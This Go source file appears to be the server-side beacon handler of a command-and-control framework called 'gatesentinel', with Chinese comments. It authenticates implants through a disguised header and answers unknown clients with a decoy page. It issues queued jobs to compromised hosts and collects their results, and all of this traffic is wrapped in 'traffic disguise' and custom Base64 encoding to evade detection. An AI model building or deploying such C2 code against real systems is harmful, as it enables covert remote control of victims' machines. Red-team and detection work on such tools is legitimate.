package handler

import (
	"encoding/base64"
	"gatesentinel/db"
	"gatesentinel/utils"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

// BeaconHandler 处理Beacon心跳请求
func BeaconHandler(c *gin.Context) {
	// 验证Token
	token := c.GetHeader("X-Request-ID")
	if !utils.ValidateClientToken(token) {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token"})
		return
	}

	// 获取并验证UUID
	clientId := c.Query("clientId")
	if !utils.ValidateUUID(clientId) {
		c.String(http.StatusOK, "It's Work!")
		return
	}

	// 获取Beacon信息
	beacon, err := db.GetBeaconByUUID(clientId)
	if err != nil {
		c.String(http.StatusOK, "It's Work!")
		return
	}

	// 更新最后在线时间
	if err := db.UpdateBeaconLastSeen(clientId); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update beacon"})
		return
	}

	// 如果是POST请求，处理任务结果
	if c.Request.Method == http.MethodPost {
		// 直接使用Gin的GetRawData方法读取完整请求体
		body, err := c.GetRawData()
		if err != nil {
			log.Printf("读取请求数据失败: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to read request data"})
			return
		}

		// 处理请求数据
		if len(body) > 0 {
			bodyStr := string(body)

			// 移除流量伪装包装
			unwrappedData := utils.UnwrapDataFromDisguise(bodyStr)

			// 解码Base64数据（使用自定义Base64解码）
			decodedData, err := utils.CustomBase64Decode(unwrappedData)
			if err != nil {
				// 尝试标准Base64解码作为备用
				decodedData, err = base64.StdEncoding.DecodeString(unwrappedData)
				if err != nil {
					log.Printf("Base64解码失败: %v", err)
					c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid base64 data"})
					return
				}
			}

			// 更新任务结果（使用解码后的数据）
			if err := db.UpdateBeaconJobResult(clientId, string(decodedData)); err != nil {
				log.Printf("更新任务结果失败: %v", err)
				c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job result"})
				return
			}

			// 更新最新的任务历史状态为完成
			updateLatestTaskHistory(clientId, "completed", string(decodedData))

			// 清空任务
			if err := db.UpdateBeaconJob(clientId, ""); err != nil {
				log.Printf("清空任务失败: %v", err)
				c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to clear job"})
				return
			}
			log.Printf("任务执行完成，已清空任务 [Beacon: %s]", clientId)
		}
	}

	// 返回任务内容
	if beacon.Job == "" {
		c.String(http.StatusOK, "")
		return
	}

	// 返回任务并立即清空任务（确保任务只被执行一次）
	job := beacon.Job
	if err := db.UpdateBeaconJob(clientId, ""); err != nil {
		log.Printf("清空任务失败: %v", err)
	} else {
		log.Printf("任务已下发，已清空任务 [Beacon: %s]", clientId)
	}

	// 使用流量伪装包装任务数据
	wrappedJob := utils.WrapDataWithDisguise(job)
	c.String(http.StatusOK, wrappedJob)
}

// updateLatestTaskHistory 更新最新的任务历史状态
func updateLatestTaskHistory(beaconUUID, status, result string) {
	// 获取该Beacon的最新任务历史
	histories, err := db.GetTaskHistoryByBeaconUUID(beaconUUID)
	if err != nil {
		log.Printf("Failed to get task history for beacon %s: %v", beaconUUID, err)
		return
	}

	if len(histories) == 0 {
		log.Printf("No task history found for beacon %s", beaconUUID)
		return
	}

	// 更新最新的任务历史（第一个，因为按时间倒序排列）
	latestTask := histories[0]
	if err := db.UpdateTaskHistory(latestTask.ID, status, result); err != nil {
		log.Printf("Failed to update task history %d: %v", latestTask.ID, err)
	} else {
		log.Printf("Updated task history %d to status: %s", latestTask.ID, status)
	}
}
